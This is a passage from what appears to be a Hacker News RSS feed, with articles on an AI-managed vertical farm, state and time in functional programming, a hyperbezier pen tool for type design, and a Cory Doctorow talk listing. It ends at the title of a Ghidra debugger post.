<p>In recent years, farmers on flat farms have been using new tools for making farming better or easier. They‚Äôre using drones and robots to improve crop maintenance, while artificial intelligence is also on the rise, with over 1,600 startups and total investments reaching tens of billions of dollars. Plenty is one of those startups. However, flat farms still use a lot of water and land, while a Plenty vertical farm can produce the same quantity of fruits and vegetables as a 720-acre flat farm, but on only 2 acres!</p>
<p>Storey said:</p>
<blockquote><p>Vertical farming exists because we want to grow the world‚Äôs capacity for fresh fruits and vegetables, and we know it‚Äôs necessary.</p></blockquote>
<p><span><iframe width="1400" height="788" src="https://www.youtube.com/embed/GO0fRU46ZHc?version=3&amp;rel=1&amp;showsearch=0&amp;showinfo=1&amp;iv_load_policy=1&amp;fs=1&amp;hl=en-GB&amp;autohide=2&amp;wmode=transparent" allowfullscreen="true" sandbox="allow-scripts allow-same-origin allow-popups allow-presentation"></iframe></span></p>
<p>Plenty‚Äôs climate-controlled indoor farm has rows of plants growing vertically, hung from the ceiling. There are sun-mimicking LED lights shining on them, <a href="https://www.intelligentliving.co/tiny-smart-robots-kill-weeds/">robots</a> that move them around, and artificial intelligence (AI) managing all the variables of water, temperature, and light, and continually learning and optimizing how to grow bigger, faster, better crops. These futuristic features ensure every plant grows perfectly year-round. The conditions are so good that the farm produces 400 times more food per acre than an outdoor flat farm.</p>

<p>Storey said:</p>
<blockquote><p>400X greater yield per acre of ground is not just an incremental improvement, and using almost two orders of magnitude less water is also critical in a time of increasing environmental stress and climate uncertainty. All of these are truly game-changers, but they‚Äôre not the only goals.</p></blockquote>
<p>Another perk of vertical farming is locally produced food. The fruits and vegetables aren‚Äôt grown 1,000 miles away or more from a city; instead, at a warehouse nearby. Meaning, many transportation miles are eliminated, which is useful for reducing millions of tons of yearly CO2 emissions and prices for consumers. Imported fruits and vegetables are more expensive, so society‚Äôs most impoverished are at an extreme nutritional disadvantage. Vertical farms could solve this problem.</p>
<p>Storey said:</p>
<blockquote><p>Supply-chain breakdowns resulting from COVID-19 and natural disruptions like this year‚Äôs California wildfires demonstrate the need for a predictable and durable supply of products can only come from vertical farming.</p></blockquote>
<figure id="attachment_39422" aria-describedby="caption-attachment-39422"><img loading="lazy" src="https://i2.wp.com/www.intelligentliving.co/wp-content/uploads/2020/12/Reuters.jpg?resize=1024%2C576&amp;ssl=1" alt="2-Acre Vertical Farm Run By AI And Robots Out-Produces 720-Acre' Flat Farm'" width="1024" height="576" srcset="https://i2.wp.com/www.intelligentliving.co/wp-content/uploads/2020/12/Reuters.jpg?resize=1024%2C576&amp;ssl=1 1024w, https://i2.wp.com/www.intelligentliving.co/wp-content/uploads/2020/12/Reuters.jpg?resize=300%2C169&amp;ssl=1 300w, https://i2.wp.com/www.intelligentliving.co/wp-content/uploads/2020/12/Reuters.jpg?resize=768%2C432&amp;ssl=1 768w, https://i2.wp.com/www.intelligentliving.co/wp-content/uploads/2020/12/Reuters.jpg?resize=960%2C540&amp;ssl=1 960w, https://i2.wp.com/www.intelligentliving.co/wp-content/uploads/2020/12/Reuters.jpg?resize=711%2C400&amp;ssl=1 711w, https://i2.wp.com/www.intelligentliving.co/wp-content/uploads/2020/12/Reuters.jpg?resize=585%2C329&amp;ssl=1 585w, https://i2.wp.com/www.intelligentliving.co/wp-content/uploads/2020/12/Reuters.jpg?w=1200&amp;ssl=1 1200w" sizes="(max-width: 1024px) 100vw, 1024px" data-recalc-dims="1"><figcaption id="caption-attachment-39422">(Credit: Reuters)</figcaption></figure>
<p>Plenty‚Äôs farms grow non-GMO crops and don‚Äôt use herbicides or pesticides. They recycle all water used, even capturing the evaporated water in the air. The flagship farm in San Francisco is using 100% renewable energy too.</p>
<p>Furthermore, all the packaging is 100% recyclable, made of recycled plastic, and specially designed to keep the food fresh longer to reduce food waste.</p>
<p>Storey told <a href="https://www.forbes.com/sites/johnkoetsier/2020/11/20/this-2-acre-vertical-farm-out-produces-750-acre-flat-farms/" target="_blank" rel="noopener">Forbes</a>:</p>
<blockquote><p>The future will be quite remarkable. And I think the size of the global fresh fruit and vegetable industry will be multiples of what it is today.</p></blockquote>
<p>Plenty has already received $400 million in investment capital from SoftBank, former Google chairman Eric Schmidt, and Amazon‚Äôs Jeff Bezos. It‚Äôs also struck a deal with Albertsons stores in California to supply 430 stores with fresh produce.</p>
<p>Ideally, the company will branch out, opening vertical farms across the country and beyond. There can never be too many places graced by better food growing with a less environmental cost.</p>
<p>Here‚Äôs a <a href="https://anchor.fm/techfirst/episodes/The-future-of-farms-is-vertical-400X-more-yield--95-less-water--99-less-space-emesrq/a-a3sf2o5" target="_blank" rel="noopener">TechFirst podcast</a> about the story behind Plenty:</p>

<p><span><iframe width="1400" height="788" src="https://www.youtube.com/embed/0uXdnjXIGjI?version=3&amp;rel=1&amp;showsearch=0&amp;showinfo=1&amp;iv_load_policy=1&amp;fs=1&amp;hl=en-GB&amp;autohide=2&amp;wmode=transparent" allowfullscreen="true" sandbox="allow-scripts allow-same-origin allow-popups allow-presentation"></iframe></span></p>
<!-- AI CONTENT END 2 -->
</div></div>]]>
            </description>
            <link>https://www.intelligentliving.co/vertical-farm-out-produces-flat-farm/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25554941</guid>
            <pubDate>Sun, 27 Dec 2020 22:47:38 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Resolving the Time Paradox Implied by Functional Programs]]>
            </title>
            <description>
<![CDATA[
Score 26 | Comments 22 (<a href="https://news.ycombinator.com/item?id=25554907">thread link</a>) | @jbmilgrom
<br/>
December 27, 2020 | https://softwarefordays.com/post/resolving-the-fp-time-paradox/ | <a href="https://web.archive.org/web/*/https://softwarefordays.com/post/resolving-the-fp-time-paradox/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

      

<p>Excerpted from <a href="https://softwarefordays.com/post/functional-programming-and-identity-state-and-time/#resolving-the-time-paradox">Functional Programming and the Semantics of Change, State &amp; Time</a>.</p>
<blockquote>
<p>‚ÄúNo man can ever cross the same river twice.‚Äù Because what‚Äôs a river? I mean, we love this idea of objects; like there‚Äôs this thing that changes. Right? There‚Äôs no river. Right? There‚Äôs water there at one point-in-time. And another point-in-time, there‚Äôs other water there. ‚Äî Rich Hickey, <a href="https://github.com/matthiasn/talk-transcripts/blob/master/Hickey_Rich/AreWeThereYet.md">Are We There Yet</a>, quoting Heraclitus.</p>
</blockquote>
<p>From the perspective of a user, a functional program may appear stateful. Interact with <a href="https://softwarefordays.com/post/functional-programming-and-identity-state-and-time/#stateful-functional-programs">the functional ATM program above</a> and notice the program remembering previous encounters. On the one hand, this is not surprising. We included an imperative layer to remember previous states. Instead of decomposing the state of the program into distinct objects, like <code>bankAccount</code> and <code>withdrawalAmount</code>, we created a single global object, the <code>store</code>. On the other hand, focusing on the ‚Äúobject‚Äù portion of the program betrays an object-oriented predisposition. The imperative piece of the program is merely a construct used to facilitate a computation based asynchronously on another. One can even imagine a programming language where such a construct is built into the language itself, hiding any imperative implementation from the programmer‚Äôs view. In fact, such a language exists that compiles to JavaScript.<sup><a href="#fn1" id="fnref1">[1]</a></sup> In other words, it is syntax, not semantics. The semantics of the program better align with the semantics of a recursive, iterative function, having state <code>S</code> at a discrete step <code>i</code> ‚Äî run the functional ATM program with the output of the previous run to produce the input for the next.</p>
<p>That a program with a functional, stateless and timeless core can maintain state is surprising, to say the least. Look around the room, bus, park or wherever you find yourself reading this sentence, and you will likely identify ‚Äúa collection of distinct objects,‚Äù such as dogs, people, and trees, ‚Äúwhose behaviors may change over time.‚Äù Look around the functional ATM program, on the other hand, and there are no identifiable objects to be found. Yet, the program appears to have state just like any other object in the room.</p>
<p>However, the ostensible ‚Äúparadox‚Äù dissipates when the augmentation of our conception of time extends beyond the functional program to include the rest of our physical reality.</p>
<blockquote>
<p>One way to resolve this paradox is to realize that it is the user‚Äôs temporal existence that imposes state on the system. If the user could step back from the interaction and think in terms of streams of balances rather than individual transactions, the system would appear stateless ‚Äî <a href="https://web.mit.edu/alexmv/6.037/sicp.pdf">SICP</a> Section 3.5.5</p>
</blockquote>
<p>Instead of viewing the <em>world</em> as the sum of its objects, each reflecting its latest state as time elapses, we may also think in terms of discrete state histories. We may interpret the dog at the park as moving in discrete steps <code>S(i)</code> to <code>S(i+1)</code>, just as we interpret the state of our functional program as moving in discrete steps <code>S(i)</code> to <code>S(i+1)</code>.</p>
<p>Consider video media. To movie scenes, we may attribute the same object-oriented semantics. Character and inanimate objects shift, interact and evolve as time elapses.</p>
<video id="metavideo" poster="https://softwarefordays.com/media/metavideoposter.gif" preload="none" width="480" controls="">
    <source src="https://softwarefordays.com/media/metavideo.mp4" type="video/mp4; codecs=&quot;avc1.42E01E, mp4a.40.2&quot;">
    <img src="https://softwarefordays.com/media/metavideo.mp4" title="Your browser does not support the mp4 video codec.">
</video>
<p>While playing the above video, for example, we may conclude that ‚Äúa cat is dancing.‚Äù Yet, videos are comprised of static frames stitched together in a certain sequence at discrete time intervals. Each frame corresponds to a state of the video at a moment in time and the frames, taken together, a time-denominated series of discrete states. The media chosen above is intentionally meta. The video includes a TV animation of a scene mirrored by a flip-book<sup><a href="#fn2" id="fnref2">[2]</a></sup>, showing static frames strung together at discrete time intervals, which itself is mirrored by a flip-book in ‚Äúreal‚Äù life, showing static frames strung together at discrete time intervals. Take another step back to notice that the above gif media (or mp4 if your browser supports html5) being played on <em>your</em> computer is comprised of static frames, strung together at discrete time intervals.</p>
<p>There is nothing stopping us from taking another step back and interpreting the real world in which your computer currently sits as static frames, strung together at discrete time intervals. We <em>may</em> attribute normal object-oriented semantics to the above gif, concluding that ‚Äúa cat is dancing.‚Äù However, we may also attribute functional semantics, concluding that ‚Äúa cat has arms above its head on frame f·µ¢.‚Äù At a park in the real world, we may conclude that ‚Äúa dog is chasing a squirrel.‚Äù However, we may also conclude that ‚Äúa dog is in the running motion behind a squirrel in the running motion on frame f·µ¢.‚Äù In both cases, we may identify a time-series of states instead of objects that change over time. The functional programming paradigm can be coherently applied to world and program alike.</p>
<p>With a model for discrete time in mind, it is less surprising that functional programs can appear stateful. A user of the program may be viewed as a series of states, just like the program itself. A specific series of user states, for example,</p>
<pre><code>U‚ÇÄ: "Open up this blog post"<br>U‚ÇÅ: ‚ÄúSelect 20 option‚Äù<br>U‚ÇÇ: ‚ÄúClick withdraw‚Äù<br>...<br>U(i): U·µ¢</code></pre>
<p>directly precipitate a series of program states:</p>
<pre><code>S‚ÇÄ: balance:100, amount:10<br>S‚ÇÅ: balance:100, amount:20<br>S‚ÇÇ: balance:80, amount:20<br>...<br>S(i): program(S·µ¢‚Çã‚ÇÅ, E·µ¢)</code></pre>
<p>In both cases, pieces of static information may be listed, one <em>after</em> another. Moreover, both lists can be plotted along the same discrete timeline <code>i</code>. User interactions come in a certain order <code>U(i)</code>, triggering a run of the program function against the result of the previous run <code>S(i-1)</code> and event data <code>E(i)</code>, in order to produce <code>S(i)</code>. Our reality can be viewed as a time-series of states, just as it can be viewed as a collection of objects. Functional programming models a time-series of states, just as as object-oriented programming models objects. When the program and world <em>alike</em> can be viewed as ‚Äústreams of information that flow in the system,‚Äù (<a href="https://web.mit.edu/alexmv/6.037/sicp.pdf">SICP</a> Section 3) the world can flow into the program, and the program back into the world.</p>
<hr>
<section>
<ol>
<li id="fn1"><p><a href="https://guide.elm-lang.org/">Elm</a> programs are trivially made to be stateful, notwithstanding the exclusive use of pure functions <em>and</em> the asynchrony of user interactions! This counter program</p>
<pre><code><span><span>import</span> Browser</span><span><br><span>import</span> Html <span>exposing</span> </span><span>(</span><span>Html</span><span>,</span> <span>button</span><span>,</span> <span>div</span><span>,</span> <span>text</span><span>)</span><br><span><span>import</span> Html.Events <span>exposing</span> </span><span>(</span><span>onClick</span><span>)</span><p><span>main</span> <span>=</span><br><span>Browser.sandbox</span> <span>{</span> <span>init</span> <span>=</span> <span>0</span><span>,</span> <span>update</span> <span>=</span> <span>update</span><span>,</span> <span>view</span> <span>=</span> <span>view</span> <span>}</span></p><p><span>type</span> <span>Msg</span> <span>=</span> <span>Increment</span> <span>|</span> <span>Decrement</span></p><p><span>update</span> <span>msg</span> <span>model</span> <span>=</span><br><span>case</span> <span>msg</span> <span>of</span><br><span>Increment</span> <span>-&gt;</span><br>  <span>model</span> <span>+</span> <span>1</span></p><p><span>Decrement</span> <span>-&gt;</span><br>  <span>model</span> <span>-</span> <span>1</span></p><p><span>view</span> <span>model</span> <span>=</span><br><span>div</span> <span>[</span><span>]</span><br><span>[</span> <span>button</span> <span>[</span> <span>onClick</span> <span>Decrement</span> <span>]</span> <span>[</span> <span>text</span> <span>"-"</span> <span>]</span><br><span>,</span> <span>div</span> <span>[</span><span>]</span> <span>[</span> <span>text</span> <span>(</span><span>String.fromInt</span> <span>model</span><span>)</span> <span>]</span><br><span>,</span> <span>button</span> <span>[</span> <span>onClick</span> <span>Increment</span> <span>]</span> <span>[</span> <span>text</span> <span>"+"</span> <span>]</span><br><span>]</span></p></code></pre>
<p>can be seen <a href="https://elm-lang.org/examples/buttons">here</a> tracking counter state, even though a user may of course click the counter buttons asynchronously. Like garbage collection in JavaScript, Elm hides any imperative code dedicated to communication between asynchronous scripts from the programmer‚Äôs view. <a href="#fnref1">‚Ü©Ô∏é</a></p>
</li>
<li id="fn2"><p>A flip-book <a href="https://softwareengineering.stackexchange.com/a/245409/369472">has been suggested</a> as a valuable mental model for state in functional programming <a href="#fnref2">‚Ü©Ô∏é</a></p>
</li>
</ol>
</section>




    </div></div>]]>
            </description>
            <link>https://softwarefordays.com/post/resolving-the-fp-time-paradox/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25554907</guid>
            <pubDate>Sun, 27 Dec 2020 22:43:14 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Hyperbezier Pen Tool]]>
            </title>
            <description>
<![CDATA[
Score 115 | Comments 21 (<a href="https://news.ycombinator.com/item?id=25554205">thread link</a>) | @raphlinus
<br/>
December 27, 2020 | https://www.cmyr.net/blog/hyperbezier.html | <a href="https://web.archive.org/web/*/https://www.cmyr.net/blog/hyperbezier.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      <article>
        <h2 id="introduction">Introduction</h2>

<p>This post introduces a new model for a path drawing (pen) tool, with a particular focus on font design.</p>

<p>Although this tool works much like familiar pen tools (which are based on the manipulation of <a href="https://en.wikipedia.org/wiki/B%C3%A9zier_curve">B√©zier curves</a>), it is actually based on a new family of two-control-point curves, which we‚Äôve been calling the <em>hyperbezier</em>.</p>

<p>This work is still in its early stages, and the demo below is quite barebones; my goal here is to get a simple version of this tool into the hands of designers and design-tool makers, so that more people can start to play around and evaluate it.</p>

<h4 id="contents">Contents</h4>



<h3 id="-background--motivation"><a id="background"></a> Background &amp; motivation</h3>

<p>The basis of this tool is a new mathematical model for fitting a curve to a set of points; that work was done earlier in the year by my collaborator <a href="https://raphlinus.github.io/">Raph Levien</a>. For the past year or so Raph has been excitedly talking to me about about things like <em>splines</em> and <em>G2 continuity</em> and the elegance of the <em>Euler spiral</em>, and I have for the most part been smiling politely and nodding. In the last few weeks however I have started trying to implement a simple drawing app around his new model, and the excitement is catching: this new tool feels like the first I have used that is a compelling alternative to traditional B√©zier-curve based drawing tools.</p>

<p>It is likely that if you have ever used a computer drawing application then you have, at some point, used a <em>pen tool</em>: a tool that allows you to place a small number of points, which are then connected with a series of curves, the exact curvature being a function of the position of the points.</p>

<p>Tools like this‚Äî which take some fixed number of points and calculate a curve based on them‚Äî are called <em>splines</em>. If you are curious about the topic (particularly in the context of interactive design tools), a very accessible overview is Raph‚Äôs <a href="https://levien.com/phd/thesis.pdf">dissertation</a>; I won‚Äôt go into too much detail here, except to say that Raph has been revisiting this subject recently, and the result is the <a href="https://github.com/linebender/spline"><em>hyperbezier spline</em></a>. Like traditional (cubic) B√©zier paths, a hyperbezier path is comprised of segments, each defined by two <em>on-curve</em> and two <em>off-curve</em> (or <em>control</em>) points; the curve passes through the two on-curve points, and the curvature itself is determined by the position of the two off-curve points.</p>

<p><img id="simple-cubic" src="https://www.cmyr.net/assets/hyperbez/hyperbez-simple-cubic1.png" alt="A simple cubic B√©zier"></p>
<p>A B√©zier path, consisting of two segments</p>

<p>If you‚Äôre generally curious about B√©ziers, <a href="https://pomax.github.io/bezierinfo/">A Primer on B√©ziers Curves</a> is an excellent resource. For our purposes it is enough to note that splines based on direct manipulation of B√©zier control points (most pen tools) provide a high degree of control, but are difficult to use well. In particular, it can be tricky to maintain consistent curvature between adjoining segments of a path, which can lead to a ‚Äòlumpy‚Äô look; the following example is  contrived, but in practice consistently getting smooth feeling curves with B√©ziers is challenging.</p>


<p>A lumpy path. Mouseover to see the filled outline.</p>

<h3 id="-the-hyperbezier"><a id="hyperbezier"></a> The hyperbezier</h3>

<p>The core idea of the hyperbezier is the use of <em>auto-points</em>. These control points are adjusted automatically by the tool in order to maintain a smooth curve between neighbouring curve segments.</p>

<p>Let‚Äôs look at an example. With the path below you can drag points around, and double-click points to toggle their type.</p>

<p>The two green squares are <em>corner</em> points; curve segments that join at these points are allowed to change direction sharply. The two blue circles are <em>smooth</em> points; changing the curve on one side of the point can cause changes in the <em>auto</em> points (and hence the curve) on the other side.</p>

<p>The auto-points are indicated with dashed lines and terminating ‚Äòx‚Äôs. The manual control points are indicated with solid lines, and terminating ‚Äòo‚Äôs.</p>




<h5 id="playing-around">Playing around</h5>
<p>To get a better understanding of the spline‚Äôs behaviour, here are some things to try <em>(this requires a mouse)</em>:</p>
<ul>
  <li><em>double-click the bottom point to make it smooth</em>. When this point is smooth, the auto points beside it are adjusted so that the two curve segments join smoothly.</li>
  <li><a href="#" onclick="reloadHeart();return false;">reset,</a> or double-click the bottom point to turn it back into a corner. Now <em>doubleclick the top-left smooth point</em>. Making the top-left point a corner will replace the curve between them with a straight line. Two adjacent corners with only auto-points between them will always form a straight line, because a line is maximally smooth.
    <ul>
      <li>You should notice two small ‚Äòx‚Äôs on this line. <em>Drag one of these auto points somewhere to position it manually</em>. You will notice that the remaining auto-point is repositioned as you drag.</li>
      <li><em>Drag the other auto-point</em>. With both control points positioned manually, and with corners at either end, you have full control of this segment.</li>
    </ul>
  </li>
</ul>

<!--(TK: SIMPLIFY ME, JUST INTRODUCE AUTO POINTS)The principal goal of the hyperbezier is to make it easier to maintain consistent curvature between adjoining segments of a path. This is achieved by letting the designer choose to have certain control points positioned automatically. These *auto-points* are adjusted in response to changes in adjoining segments so as to form a [smooth][smoothness] curve.-->

<!--In addition, on-curve points can be either *smooth* points or *corners*; if a point is smooth (marked by a green circle) then any auto points on either side of that point will be adjusted to maintain curvature with the segment on the other side. If a point is a corner (marked by a blue square) then the segment on one side of the point is not influenced by the curvature on the other side.-->

<!--Moving any on-curve point can cause subtle changes to the position of multiple auto-points; the example below is interactive, and you can drag the various points around, or toggle their type. Notice how the behaviour of the auto points changes if you toggle a nearby on-curve point between smooth and corner;

<iframe class="embedded-toy"
    title="Interactive hyperbezier toy"
    width="400"
    height="400"
    src="https://www.cmyr.net/misc/hyperbez/#AAE=eJxVzL0JgDAUBOCcYO8IjvImsFTQMmIpuEGmcJtARnlDpA0ELpCfq46P42BKZjNGkxWWeMhUddk_argeQWPdbrL6t2f3n-TV2WHdXQNsyEpvEhM=">
</iframe>
<div class = "img-caption">This demo requires a fairly recent browser</div>
-->

<h3 id="-the-toy-pen-tool"><a id="the-toy"></a> The toy pen tool</h3>

<p>If you‚Äôre curious to try drawing with this tool, <a href="https://cmyr.net/misc/hyperbez">There is a simple web app available here</a> (and embedded below).</p>




<p>Below are some examples of letterforms I‚Äôve sketched in the process of getting this working. These may offend the actual type designers in the room, but I hope they will be useful illustrations.</p>

<p><a href="https://www.cmyr.net/misc/hyperbez/#AAE=eJxlkj3OgUEUhWe-fHqFBSiVSuVdwhuFKBQjQUQk3viPv4y8oqBRKpVKpdISLMESLIG4J8xhmkmenDn33Hvn3-hJma_jhvK6pSJ_H-rbStNdsQEWiP2E8GWhONsnHFhb-6YZ83WkrjIXhwnMCKVK5BktFd-aYsJgCXCV1Nc1gnU42ApqxhGwaxC-o6S0gLWXK3Dc0zvnYTqi19mB4vyMsEfTY0_YYGTHJeE0kkVrwjG8y1s2KSo-sfrWQuCERmeqivecxNUU3-c8jFixm_L8Pzu09veP4dEhCTf8_BZqyTF3aOq8IVzAhs-sDqyNtRJWfQBl00gu" onclick="return reloadMain(event, 'g');"><img src="https://www.cmyr.net/assets/hyperbez/hyper-g-small-fill.png"></a>
<a href="https://www.cmyr.net/misc/hyperbez/#AAE=eJxt0TsKwkAQBuDZWGiZRrEKuYB9OucGRmJhlzQmNiq-QVCCBLFQsLbKUXKUHMDC0lJkJji7ZJssH39mZncbYKyOCUWEtBmhJXhKijEqVZnLOM4Q_jgh7F4Ewpwwugp8rAk9TjqvIHxaK-z1B05bq1kuKZnvBdoHQnchG5240VYmK8xQiTPlXLV1R_gx5SMu-7nRF_wzbexMHN1jdGUf_8i_JAIL7lLsahBibaL3hjmgiYxBcail0xlXDrV0mRCnelq8q7gu1QSxvvatM50=" onclick="return reloadMain(event, 'h');"><img src="https://www.cmyr.net/assets/hyperbez/hyper-h-small-fill.png"></a>
<a href="https://www.cmyr.net/misc/hyperbez/#AAE=eJxd0rEKwjAQBuCkk2PHjn2EPkJeQQQpqNCCYEWQIiJ0KFTbKuri6NhH6CPkERwdHR0zOgq5K_b3liMfuUtyxBEUnviLYqxsNpVyftrErAclLUu79JfEjz3laE35VijRq25T4qSrpjA1cYj8ZDYZsF5x7xzY3RD7C-CgJNYz4OjMPEe-MofA9wtxMQL-dLuHwIpZxDAjl49UPCtzohykMCOdc_UU38HPe22BQ76Z2uHojsReCdxmxO8aL5wQu7hbT7hJBdxExANs0vsvUgqMLzuHP6M=" onclick="return reloadMain(event, 's');"><img src="https://www.cmyr.net/assets/hyperbez/hyper-s-small-fill.png"></a>
<a href="https://www.cmyr.net/misc/hyperbez/#AAE=eJx1kquOAkEQRXs2K1auXNnrECv3A8pssjggEAgKSEgIgWQAA8EM4TEISHj8AgI5EjkSySfwCUgkj6qmq0jTpjInt27Vne539ep8PwMowL3qCrxZGuSRxkXwPANLdYSQAo9pdROxyjCtgccaKKY99hAHabLAhv8xWVSpi77jhuiGOeG0WCBaIfa7bIENwcNYaEdrxF-hwDPCUSgGJhZO_Ev4U5oklnbkY48fA_si8XaKWCWx6gnWoMV6PybODKfQOf5MeHetDwt_YCHTdgk__QYYOhKkhs4EQRux-qNKN659Nv52gbezlwn8tnO8sYx4ApWzkGnjrNOiVHYkMFB3ZFr79K2WzgVbDlNT" onclick="return reloadMain(event, 'm');"><img src="https://www.cmyr.net/assets/hyperbez/hyper-m-small-fill.png"></a>
<a href="https://www.cmyr.net/misc/hyperbez/#AAE=eJxt0b0OgjAQB_CrA2FkMXH0EXyEDg5OBI1x0YGZOIBGIxETjHysPgKTs4s7j8BkHImLr-Fwld6BXUh-XP-9a3uAy4DWKj2J36UUHdtLaNDyGxQ9vd85Ihdrxr6vY8Wfs0D0od3JDP_CXHcCG20k3Twr9hhXO2R5kEAYYuR7xKqlCjFTxq8EubqwkEmKPEgYXyNkJ_uFPN_GOLiFEqLis32cWDYEWO2G5FZqr0HooMWbG6qAIiO1I4VWTlLBVtPlpDK29XaSWq7UbCl9LIW1y0eYIscLHkEeT0V8Ab6RQUE=" onclick="return reloadMain(event, 'r');"><img src="https://www.cmyr.net/assets/hyperbez/hyper-r-small-fill.png"></a></p>
<p>Some example paths, drawn in the tool.</p>

<!--. This is very much a demo; the idea is to explore the interaction model, and to get a sense for how it feels to draw with the tool, compared to the standard B√©zier curves used in most pen tools. Spoiler: I think it feels *really good*. You [can play around with it yourself][hypertoy]; it is pretty rough around the edges, but it works.-->

<h4 id="-using-the-toy-pen-tool"><a id="toy-guide"></a> Using the toy pen tool</h4>

<p>The toy is very rough: you have a select and a pen tool, but there are no rulers or measurement tools, no transforms, no ability to select multiple points. The pen works much like the familiar B√©zier pen:</p>

<p>General:</p>

<ul>
  <li><code>V</code> key sets selection (arrow) tool, <code>P</code> key sets pen tool</li>
  <li>holding the space bar hides UI and shows filled path</li>
  <li>the current drawing is stored as part of the URL; copy this somewhere to ‚Äúsave‚Äù</li>
</ul>

<p>Pen tool:</p>

<ul>
  <li>click to add a line segment ending in a corner point</li>
  <li>alt + click to add an automatic curve segment ending in a smooth point</li>
  <li>click + drag to add a curve segment ending in a smooth point, with a manual control point</li>
  <li>click on a line segment to insert a point there; alt makes it a smooth point</li>
  <li>alt + click on any existing point to toggle the type of that point</li>
</ul>

<p>Select tool:</p>

<ul>
  <li>drag a control auto-point to move it, converting it to a manual point if necessary</li>
  <li>double-click will toggle an on-curve point between smooth and corner</li>
  <li>alt + click on a line segment to add two auto points</li>
  <li>deleting an off-curve point makes that curve segment into a line segment</li>
  <li>arrow keys nudge the current selection by 1 px; adding shift makes it 10px, and ctrl/cmd makes it 100px.</li>
  <li>shift + any of the above moves all of the points in the current outline (I‚Äôm sorry)</li>
</ul>

<h3 id="-next-steps"><a id="next-steps"></a> Next steps</h3>

<p>The code for the spline, including the demo, is <a href="https://github.com/linebender/spline">open source and available on github</a>.</p>

<p>The intent of this demo is twofold: firstly to test out how the curve feels to use, and to start playing around with the UX of the pen tool, and secondly to share this research with the broader community of designers and design-tool creators. Although this work is quite rough, my personal feeling is that this spline shows tremendous promise. Anecdotally, as a mere casual user of design tools, I find it <em>significantly</em> easier to make good looking curves with the hyperbezier than I do with traditional B√©zier pen tools.</p>

<p>Perhaps the biggest question will be figuring out the best interaction model: what set of mouse clicks, key presses and modifiers the user issues in order to control the state of the points. This has been a challenge for other new splines; the interaction model we use with B√©ziers is <a href="https://youtu.be/sT8Y7o-zsVw?t=68">familiar and long-established</a>, and people (especially graphic designers) are deeply comfortable with it. The interaction model used here for the hyperbezier is intentionally designed to feel similar to these existing tools, but other interaction models may be worth exploring.</p>

<p>In the coming weeks I hope to integrating the spline into <a href="https://github.com/linebender/runebender">Runebender</a>, a font editor, which will provide a much richer editing experience and will let us better explore how well the spline is suited to real-world use. In addition, Raph intends to do a more detailed writeup of the spline itself and the associated math, which derives both from the earlier Spiro spline and the classic model of elastica under tension.</p>

<p>If you‚Äôre curious about the spline, there are more details in the <a href="https://github.com/linebender/spline">github repo</a>; if you have questions you can open an issue there, ask them in our <a href="https://xi.zulipchat.com/">zulip chat server</a> or reach out on <a href="https://twitter.com/cmyr">on twitter</a>.</p>

<h3 id="thanks">Thanks</h3>

<p>This work was funded by <a href="https://fonts.google.com/about">Google Fonts</a>.</p>

<!--- this is particularly useful for fonts
* fix bug with click-drag
* rebuild example
* revisit "next steps": we want to encourage other folks to adopt this
* explicitly mention that all of this is open source
-->


      </article>

    </div></div>]]>
            </description>
            <link>https://www.cmyr.net/blog/hyperbezier.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25554205</guid>
            <pubDate>Sun, 27 Dec 2020 20:59:40 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Cory Doctorow (CCC): What the cyberoptimists got wrong ‚Äì and what to do about it]]>
            </title>
            <description>
<![CDATA[
Score 10 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25553662">thread link</a>) | @aleclm
<br/>
December 27, 2020 | https://media.ccc.de/v/rc3-11337-what_the_cyberoptimists_got_wrong_-_and_what_to_do_about_it | <a href="https://web.archive.org/web/*/https://media.ccc.de/v/rc3-11337-what_the_cyberoptimists_got_wrong_-_and_what_to_do_about_it">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">



<div>

<p>
<span></span>
<a href="https://media.ccc.de/search?p=doctorow">doctorow</a>

</p>


<!-- %h3 About -->
<p>They stole our future. Let's take it back.</p>

<p>Here at the end of the world, it's time to take stock. Is technology a force for good? Can it be? Was it ever? How did we end up with a world made up of "five websites, each filled with screenshots of text from the other four" (h/t Tom Eastman)? Should we worry that machine learning will take away our free will through A/B splitting and Big Five Personality Types? Where the fuck did all these Nazis come from? </p>

<h3>Download</h3>
<div>
<p>

Downloads will appear here, once final recordings are released.
</p></div>
<!-- %h3 Embed/Share -->

<h3>Tags</h3>

</div>





</div>]]>
            </description>
            <link>https://media.ccc.de/v/rc3-11337-what_the_cyberoptimists_got_wrong_-_and_what_to_do_about_it</link>
            <guid isPermaLink="false">hacker-news-small-sites-25553662</guid>
            <pubDate>Sun, 27 Dec 2020 19:42:01 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A first look at Ghidra‚Äôs Debugger ‚Äì Game Boy Advance Edition]]>
            </title>
            <description>
<![CDATA[
Score 164 | Comments 14 (<a href="https://news.ycombinator.com/item?id=25553105">thread link</a>) | @mr_golyadkin
<br/>
December 27, 2020 | https://wrongbaud.github.io/posts/ghidra-debugger/ | <a href="https://web.archive.org/web/*/https://wrongbaud.github.io/posts/ghidra-debugger/">archive.org</a>
